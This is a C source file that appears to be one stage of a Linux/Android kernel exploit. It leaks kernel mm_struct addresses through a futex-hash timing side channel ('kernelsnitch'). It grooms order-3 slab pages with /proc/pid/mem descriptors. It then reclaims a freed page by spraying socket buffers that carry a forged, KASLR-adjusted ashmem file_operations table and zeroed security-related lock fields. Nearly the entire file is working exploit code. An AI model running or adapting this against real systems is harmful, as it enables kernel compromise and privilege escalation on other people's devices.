#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <limits.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "target.h"
#include <kernelsnitch/kernelsnitch.h>

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define SKB_DATA_HEAD_SIZE 0xe80
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_PAYLOAD_OFFSET SKB_DATA_HEAD_SIZE
#define FOPS_OFFSET 0x100
#define FOPS_TABLE_SIZE 0x120
#define SKB_USERCOPY_LOCK_OFF 0x900
#define SKB_USERCOPY_VALUE_OFF 0xa00
#define SKB_SELINUX_LOCK_OFF 0xb00
#define SKB_OWNER_LOCK_OFF 0xc00

struct mm_ctx {
  size_t count;
  pid_t *children;
  int *memfds;
};

enum mm_zone {
  MM_ZONE_INVALID,
  MM_ZONE_DMA32,
  MM_ZONE_NORMAL,
};

static uint64_t started_ms;

static void fail(const char *what) {
  perror(what);
  exit(1);
}

static void check(long value, const char *what) {
  if (value < 0)
    fail(what);
}

static uint64_t monotonic_ms(void) {
  struct timespec time;

  check(clock_gettime(CLOCK_MONOTONIC, &time), "clock_gettime");
  return (uint64_t)time.tv_sec * 1000 + (uint64_t)time.tv_nsec / 1000000;
}

static uint64_t elapsed_ms(void) { return monotonic_ms() - started_ms; }

static pid_t spawn_paused(void) {
  pid_t child = fork();

  if (child < 0)
    fail("fork");
  if (!child) {
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) < 0 || getppid() == 1)
      _exit(2);
    pin_to_core(0);
    for (;;)
      pause();
  }
  return child;
}

static pid_t spawn_collision(struct kernelsnitch_shared_state *ks) {
  pid_t child = fork();

  if (child < 0)
    fail("fork collision");
  if (!child) {
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) < 0 || getppid() == 1)
      _exit(2);
    kernelsnitch_find_collisions(ks);
    _exit(kernelsnitch_found_collisions(ks) ? 0 : 4);
  }
  return child;
}

static int open_mem(pid_t child) {
  char path[64];
  int fd;

  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    fail(path);
  return fd;
}

static void reap_child(pid_t child) {
  if (child <= 0)
    return;
  check(kill(child, SIGKILL), "kill");
  check(waitpid(child, NULL, 0), "waitpid");
}

static int clone_memfd(void) {
  pid_t child = spawn_paused();
  int fd = open_mem(child);

  reap_child(child);
  return fd;
}

static void ctx_init(struct mm_ctx *ctx, size_t count) {
  ctx->count = count;
  ctx->children = calloc(count, sizeof(*ctx->children));
  ctx->memfds = calloc(count, sizeof(*ctx->memfds));
  if (!ctx->children || !ctx->memfds)
    fail("calloc context");
  for (size_t i = 0; i < count; ++i) {
    ctx->children[i] = -1;
    ctx->memfds[i] = -1;
  }
}

static void close_ctx(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->count; ++i) {
    if (ctx->memfds[i] >= 0) {
      check(close(ctx->memfds[i]), "close memfd");
      ctx->memfds[i] = -1;
    }
    if (ctx->children[i] > 0) {
      reap_child(ctx->children[i]);
      ctx->children[i] = -1;
    }
  }
  free(ctx->children);
  free(ctx->memfds);
  memset(ctx, 0, sizeof(*ctx));
}

static size_t collision_time(const struct kernelsnitch_shared_state *ks,
                             size_t address) {
  for (size_t i = 2; i < ks->total_futexes; ++i) {
    size_t id = i * KS_PAGE_SIZE | i * 8 % KS_PAGE_SIZE;

    if ((size_t)&ks->futexes[id] == address)
      return ks->times[i];
  }
  return 0;
}

static void print_ks(const struct kernelsnitch_shared_state *ks,
                     uintptr_t leaked) {
  size_t offset = leaked & (ORDER3_SIZE - 1);

  printf("PAGE_LEAK_KS mm=0x%016zx base=0x%016zx slot=%zu "
         "collisions=%zu appended=%zu\n",
         leaked, leaked & ~(ORDER3_SIZE - 1), offset / MM_STRUCT_SZ,
         ks->collisions, ks->appended_futexes);
  for (size_t i = 1; i < ks->collisions; ++i)
    printf("PAGE_LEAK_COLLISION index=%zu futex=0x%016zx time=%zu\n", i,
           ks->futex_addrs[i], collision_time(ks, ks->futex_addrs[i]));
}

static enum mm_zone zone_of(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);

  if (base >= MM_DMA32_ALIAS_START && base < MM_DMA32_ALIAS_END)
    return MM_ZONE_DMA32;
  if (base >= MM_NORMAL_ALIAS_START && base < MM_NORMAL_ALIAS_END)
    return MM_ZONE_NORMAL;
  return MM_ZONE_INVALID;
}

static const char *zone_name(enum mm_zone zone) {
  if (zone == MM_ZONE_DMA32)
    return "dma32";
  if (zone == MM_ZONE_NORMAL)
    return "normal";
  return "invalid";
}

static int valid_mm(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);
  uintptr_t offset = mm - base;

  return zone_of(mm) != MM_ZONE_INVALID && offset < ORDER3_SIZE &&
         offset % MM_STRUCT_SZ == 0;
}

static uintptr_t match_page(const struct kernelsnitch_shared_state *ks,
                            uintptr_t base) {
  uintptr_t found = (uintptr_t)-1;
  size_t count = 0;

  for (uintptr_t candidate = base; candidate < base + ORDER3_SIZE;
       candidate += MM_STRUCT_SZ) {
    size_t hash = futex_hash(ks->futex_addrs[0], candidate);
    size_t matches = 1;

    for (size_t i = 1; i < ks->collisions; ++i)
      matches += hash == futex_hash(ks->futex_addrs[i], candidate);
    if (matches == ks->collisions) {
      found = candidate;
      count++;
    }
  }
  return count == 1 ? found : (uintptr_t)-1;
}

static int leak_mm(size_t cpu_count, uintptr_t hint, uintptr_t *mm_out,
                   int *hint_hit) {
  uintptr_t current_hint = hint;
  size_t collisions = hint ? 2 : 4;
  size_t passes = hint ? 2 : 1;

  *hint_hit = 0;
  for (size_t pass = 0; pass < passes; ++pass) {
    struct kernelsnitch_shared_state *ks =
        kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
    pid_t child;
    int fd;
    int status;

    if (!ks)
      return -1;
    kernelsnitch_set_profile(ks, 256, REPEAT_MEASUREMENT, AVERAGE);
    child = spawn_collision(ks);
    fd = open_mem(child);
    if (waitpid(child, &status, 0) < 0 || !WIFEXITED(status) ||
        WEXITSTATUS(status) || !kernelsnitch_found_collisions(ks)) {
      close(fd);
      ks->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(ks);
      if (current_hint) {
        current_hint = 0;
        collisions = 4;
        continue;
      }
      return -2;
    }
    if (current_hint) {
      ks->mm_struct = match_page(ks, current_hint);
      if (ks->mm_struct == (uintptr_t)-1) {
        close(fd);
        ks->state = KERNELSNITCH_MM_NOT_FOUND;
        kernelsnitch_cleanup(ks);
        current_hint = 0;
        collisions = 4;
        continue;
      }
      ks->found = 1;
      ks->state = KERNELSNITCH_MM_FOUND;
      *hint_hit = 1;
    } else {
      kernelsnitch_bruteforce(ks);
    }
    if (ks->mm_struct == (uintptr_t)-1) {
      close(fd);
      kernelsnitch_cleanup(ks);
      return -2;
    }
    *mm_out = ks->mm_struct;
    kernelsnitch_cleanup(ks);
    return fd;
  }
  return -2;
}

static int collect_full_normal_group(size_t cpu_count, uintptr_t *base_out,
                                     int *chosen_fds) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t max_groups = 64;
  const size_t opaque_capacity = A536_PAGE_SCAN_MAX * batch;
  uintptr_t *bases = calloc(max_groups, sizeof(*bases));
  size_t *counts = calloc(max_groups, sizeof(*counts));
  int *fds = malloc(max_groups * batch * sizeof(*fds));
  unsigned char *seen = calloc(max_groups * batch, sizeof(*seen));
  int *opaque = malloc(opaque_capacity * sizeof(*opaque));
  size_t opaque_count = 0;
  size_t group_count = 0;
  size_t chosen = max_groups;
  uintptr_t hint = 0;
  unsigned long chosen_attempt = 0;
  int result = 0;

  if (!bases || !counts || !fds || !seen || !opaque)
    fail("allocate page groups");
  for (size_t i = 0; i < max_groups * batch; ++i)
    fds[i] = -1;
  for (size_t i = 0; i < batch; ++i)
    chosen_fds[i] = -1;
  printf("PAGE_LEAK_GROUP_SEARCH scans=%d zone=normal dma32_skip=%d\n",
         A536_PAGE_SCAN_MAX, A536_DMA32_SKIP_SLABS);

  for (unsigned long attempt = 1; attempt <= A536_PAGE_SCAN_MAX && !result;
       ++attempt) {
    uintptr_t mm = 0;
    uintptr_t base;
    size_t slot;
    size_t group = max_groups;
    int hint_hit;
    int fd = leak_mm(cpu_count, hint, &mm, &hint_hit);

    if (fd == -2)
      continue;
    if (fd < 0)
      break;
    if (!valid_mm(mm)) {
      check(close(fd), "close invalid mm");
      continue;
    }
    base = mm & ~(ORDER3_SIZE - 1);
    slot = (mm - base) / MM_STRUCT_SZ;
    if (zone_of(base) == MM_ZONE_DMA32) {
      size_t refs = A536_DMA32_SKIP_SLABS * batch;

      if (opaque_count + refs > opaque_capacity) {
        check(close(fd), "close dma32 limit");
        break;
      }
      opaque[opaque_count++] = fd;
      pin_to_core(0);
      for (size_t i = 1; i < refs; ++i)
        opaque[opaque_count++] = clone_memfd();
      printf("PAGE_LEAK_DMA32_SKIP attempt=%lu base=0x%016zx "
             "refs=%zu total=%zu t_ms=%" PRIu64 "\n",
             attempt, base, refs, opaque_count, elapsed_ms());
      hint = 0;
      continue;
    }
    hint = base;
    for (size_t i = 0; i < group_count; ++i)
      if (bases[i] == base) {
        group = i;
        break;
      }
    if (group == max_groups && group_count < max_groups) {
      group = group_count++;
      bases[group] = base;
    }
    if (group == max_groups || slot >= batch) {
      check(close(fd), "close duplicate mm");
      continue;
    }
    if (seen[group * batch + slot]) {
      if (opaque_count >= opaque_capacity) {
        check(close(fd), "close duplicate limit");
        break;
      }
      opaque[opaque_count++] = fd;
      hint = 0;
      printf("PAGE_LEAK_DUPLICATE_HOLD attempt=%lu group=%zu "
             "base=0x%016zx slot=%zu held=%zu t_ms=%" PRIu64 "\n",
             attempt, group, base, slot, opaque_count, elapsed_ms());
      continue;
    }
    seen[group * batch + slot] = 1;
    fds[group * batch + slot] = fd;
    counts[group]++;
    if (counts[group] == 1 || counts[group] % 8 == 0 ||
        counts[group] + 1 >= batch)
      printf("PAGE_LEAK_GROUP attempt=%lu group=%zu base=0x%016zx "
             "slot=%zu count=%zu hint=%d t_ms=%" PRIu64 "\n",
             attempt, group, base, slot, counts[group], hint_hit, elapsed_ms());
    if (counts[group] == batch) {
      chosen = group;
      chosen_attempt = attempt;
      *base_out = base;
      result = 1;
    }
  }

  pin_to_core(0);
  for (size_t group = 0; group < group_count; ++group)
    for (size_t slot = 0; slot < batch; ++slot) {
      int fd = fds[group * batch + slot];

      if (fd < 0)
        continue;
      if (result && group == chosen) {
        chosen_fds[slot] = fd;
        continue;
      }
      check(close(fd), "close unused group");
    }
  for (size_t i = 0; i < opaque_count; ++i)
    check(close(opaque[i]), "close dma32 hold");
  if (result)
    printf("PAGE_LEAK_GROUP_FULL group=%zu base=0x%016zx "
           "attempts=%lu t_ms=%" PRIu64 "\n",
           chosen, *base_out, chosen_attempt, elapsed_ms());
  else
    printf("PAGE_LEAK_GROUP_FAIL groups=%zu scans=%d t_ms=%" PRIu64 "\n",
           group_count, A536_PAGE_SCAN_MAX, elapsed_ms());
  free(opaque);
  free(seen);
  free(fds);
  free(counts);
  free(bases);
  return result;
}

static int drain_group(int *target_fds) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t trigger_refs = A536_TRIGGER_SLABS * batch;
  int *triggers = malloc(trigger_refs * sizeof(*triggers));
  int s2;

  if (!triggers)
    fail("allocate trigger slabs");
  pin_to_core(0);
  for (size_t i = 0; i < trigger_refs; ++i)
    triggers[i] = clone_memfd();
  s2 = clone_memfd();
  printf("PAGE_LEAK_TRIGGER_READY pages=%d refs=%zu s2=%d cpu=%d\n",
         A536_TRIGGER_SLABS, trigger_refs, s2, sched_getcpu());
  for (size_t i = 0; i + 1 < batch; ++i)
    check(close(target_fds[i]), "close target");
  usleep(1000 * 1000);
  for (size_t page = 0; page < A536_TRIGGER_SLABS; ++page)
    check(close(triggers[page * batch]), "close trigger head");
  check(close(target_fds[batch - 1]), "close target tail");
  free(triggers);
  printf("PAGE_LEAK_TARGET_TAIL_FREE pages=%d refs_held=%zu cpu=%d\n",
         A536_TRIGGER_SLABS, trigger_refs - A536_TRIGGER_SLABS + 1,
         sched_getcpu());
  return 1;
}

static ssize_t send_blob_flags(int fd, unsigned char *blob, int flags) {
  struct iovec iov = {
      .iov_base = blob,
      .iov_len = SKB_SEND_SIZE,
  };
  struct msghdr msg = {
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  return sendmsg(fd, &msg, flags);
}

static void put64(unsigned char *blob, size_t offset, uint64_t value) {
  memcpy(blob + offset, &value, sizeof(value));
}

static void fill_fops(unsigned char *blob, uint64_t slide) {
  static const struct {
    size_t offset;
    uint64_t image;
  } slots[] = {
      {0x00, 0},
      {0x08, ASHMEM_FOPS_08_IMAGE},
      {0x10, ASHMEM_FOPS_10_IMAGE},
      {0x18, ASHMEM_FOPS_18_IMAGE},
      {0x50, ASHMEM_FOPS_50_IMAGE},
      {0x58, ASHMEM_FOPS_58_IMAGE},
      {0x60, ASHMEM_FOPS_60_IMAGE},
      {0x70, ASHMEM_FOPS_70_IMAGE},
      {0x80, ASHMEM_FOPS_80_IMAGE},
      {0xc8, ASHMEM_FOPS_C8_IMAGE},
      {0xe0, ASHMEM_FOPS_E0_IMAGE},
  };
  size_t base = SKB_PAYLOAD_OFFSET + FOPS_OFFSET;

  memset(blob + base, 0, FOPS_TABLE_SIZE);
  memset(blob + ORDER3_SIZE + base, 0, FOPS_TABLE_SIZE);
  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); ++i) {
    put64(blob, base + slots[i].offset, slots[i].image + slide);
    put64(blob, ORDER3_SIZE + base + slots[i].offset, slots[i].image + slide);
  }
}

static int spray_skb(int fd, unsigned char *blob) {
  unsigned long full = 0;
  ssize_t last = 0;
  int last_errno = 0;

  for (unsigned long i = 0; i < A536_SKB_SENDS; ++i) {
    errno = 0;
    last = send_blob_flags(fd, blob, i ? MSG_DONTWAIT : 0);
    last_errno = errno;
    if (last != SKB_SEND_SIZE)
      break;
    full++;
  }
  printf("PAGE_LEAK_SKB_SENT requested=%d full=%lu last=%zd errno=%d "
         "t_ms=%" PRIu64 "\n",
         A536_SKB_SENDS, full, last, last_errno, elapsed_ms());
  return full != 0;
}

int a536_reclaim_page(uint64_t slide) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  struct kernelsnitch_shared_state *ks;
  int pcp[2] = {-1, -1};
  int skb[2] = {-1, -1};
  int target_fds[ORDER3_SIZE / MM_STRUCT_SZ];
  int leak_memfd;
  pid_t leak_child;
  int status;
  long cpu_count;
  uintptr_t leaked;
  uintptr_t base;
  unsigned char *blob;

  started_ms = monotonic_ms();
  check(prctl(PR_SET_PDEATHSIG, SIGKILL), "prctl parent death");
  if (getppid() == 1)
    _exit(2);
  set_unbuffer();
  set_limit();
  set_proc_name("rmg-page-leak");
  pin_to_core(0);
  cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
  if (cpu_count < 1)
    fail("cpu count");
  printf("PAGE_LEAK_START pid=%d cpus=%ld\n", getpid(), cpu_count);

  ctx_init(&prep, 32 * batch);
  ctx_init(&spray, (1 + MM_PARTIALS) * batch);
  ctx_init(&pre, batch - 1);
  ctx_init(&post, batch);
  for (size_t i = 0; i < prep.count; ++i)
    prep.memfds[i] = clone_memfd();
  for (size_t i = 0; i < spray.count; ++i)
    spray.memfds[i] = clone_memfd();

  ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, (size_t)cpu_count, 4, 0, 0);
  if (!ks)
    fail("kernelsnitch setup");
  for (size_t i = 0; i < pre.count; ++i)
    pre.children[i] = spawn_paused();
  leak_child = spawn_collision(ks);
  for (size_t i = 0; i < post.count; ++i)
    post.children[i] = spawn_paused();
  for (size_t i = 0; i < pre.count; ++i)
    pre.memfds[i] = open_mem(pre.children[i]);
  leak_memfd = open_mem(leak_child);
  for (size_t i = 0; i < post.count; ++i)
    post.memfds[i] = open_mem(post.children[i]);
  for (size_t i = 0; i < pre.count; ++i) {
    reap_child(pre.children[i]);
    pre.children[i] = -1;
  }
  for (size_t i = 0; i < post.count; ++i) {
    reap_child(post.children[i]);
    post.children[i] = -1;
  }
  if (waitpid(leak_child, &status, 0) != leak_child || !WIFEXITED(status) ||
      WEXITSTATUS(status) || !kernelsnitch_found_collisions(ks)) {
    fprintf(stderr, "PAGE_LEAK_COLLISIONS_FAIL status=%d state=%d\n", status,
            ks->state);
    return 2;
  }
  printf("PAGE_LEAK_COLLISIONS_OK\n");

  blob = malloc(SKB_SEND_SIZE);
  if (!blob)
    fail("allocate skb blob");
  memset(blob, 0x50, SKB_SEND_SIZE);
  memcpy(blob + SKB_PAYLOAD_OFFSET, "RMG-CLEAN-PAGE", 14);
  memcpy(blob + ORDER3_SIZE + SKB_PAYLOAD_OFFSET, "RMG-CLEAN-PAGE", 14);
  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    memset(blob + chunk + SKB_PAYLOAD_OFFSET, 0, FOPS_OFFSET);
    memset(blob + chunk + SKB_PAYLOAD_OFFSET + SKB_USERCOPY_LOCK_OFF, 0,
           SKB_USERCOPY_VALUE_OFF - SKB_USERCOPY_LOCK_OFF + sizeof(uint64_t));
    memset(blob + chunk + SKB_PAYLOAD_OFFSET + SKB_SELINUX_LOCK_OFF, 0, 0x20);
    memset(blob + chunk + SKB_PAYLOAD_OFFSET + SKB_OWNER_LOCK_OFF, 0, 0x20);
  }
  fill_fops(blob, slide);
  put64(blob, SKB_PAYLOAD_OFFSET + 0x800, 0x4135333652454144ULL);
  put64(blob, ORDER3_SIZE + SKB_PAYLOAD_OFFSET + 0x800, 0x4135333652454144ULL);

  check(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp), "socketpair pcp");
  check(socketpair(AF_UNIX, SOCK_STREAM, 0, skb), "socketpair skb");
  {
    int sndbuf = A536_SKB_SNDBUF;

    check(setsockopt(skb[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)),
          "set skb buffer");
  }
  check(send_blob_flags(pcp[0], blob, 0) == SKB_SEND_SIZE ? 0 : -1,
        "send pcp blob");
  printf("PAGE_LEAK_PCP_SENT\n");

  for (size_t i = 0; i < spray.count; i += batch) {
    check(close(spray.memfds[i]), "close spray stride");
    spray.memfds[i] = -1;
  }
  check(close(pre.memfds[pre.count - 1]), "close target neighbor pre");
  pre.memfds[pre.count - 1] = -1;
  check(close(post.memfds[0]), "close target neighbor post");
  post.memfds[0] = -1;
  for (size_t i = 0; i + 1 < pre.count; ++i) {
    check(close(pre.memfds[i]), "close pre");
    pre.memfds[i] = -1;
  }
  for (size_t i = 1; i + 1 < post.count; ++i) {
    check(close(post.memfds[i]), "close post");
    post.memfds[i] = -1;
  }
  check(close(pcp[0]), "close pcp sender");
  check(close(pcp[1]), "close pcp receiver");
  for (int i = 0; i < 4; ++i)
    sched_yield();
  check(close(leak_memfd), "close collision mem");
  for (size_t i = 0; i < prep.count; i += batch) {
    check(close(prep.memfds[i]), "close prep stride");
    prep.memfds[i] = -1;
  }

  kernelsnitch_bruteforce(ks);
  leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    fprintf(stderr, "PAGE_LEAK_MM_FAIL\n");
    return 3;
  }
  print_ks(ks, leaked);
  pin_to_core(0);
  close_ctx(&prep);
  close_ctx(&spray);
  if (!collect_full_normal_group((size_t)cpu_count, &base, target_fds))
    return 4;
  printf("PAGE_LEAK_GROUP_SELECTED base=0x%016zx zone=%s\n", base,
         zone_name(zone_of(base)));
  if (!drain_group(target_fds))
    return 4;
  if (!spray_skb(skb[0], blob))
    return 4;
  kernelsnitch_cleanup(ks);
  printf("PAGE_LEAK_TARGET_READY initial_mm=0x%016zx "
         "selected_base=0x%016zx selected_zone=normal t_ms=%" PRIu64 "\n",
         leaked, base, elapsed_ms());
  fflush(stdout);
  alarm(120);
  for (;;)
    pause();
}
